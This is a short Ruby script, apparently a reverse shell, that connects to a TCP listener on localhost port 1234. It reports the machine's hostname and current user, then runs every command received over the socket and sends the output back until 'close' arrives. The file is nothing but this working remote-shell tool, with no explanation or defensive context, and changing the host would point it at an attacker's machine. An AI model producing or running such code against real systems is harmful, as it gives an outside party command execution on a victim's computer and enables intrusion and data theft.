require 'socket'
require 'open3'

hostname = 'localhost'
port = 1234

s = TCPSocket.open(hostname, port)

output_hostname = `hostname`
output_username = `whoami`

s.puts("Welcome to #{output_hostname}You are logged in as #{output_username}Run close to exit properly\n")
       
while (true)
  line = s.gets.chomp
  if line == 'close'
    s.close
    break
  end
  Open3.popen3(line) do |stdin, stdout, stderr, wait_thr|
    s.puts(stdout.read,stderr.read)
  end
end
s.close
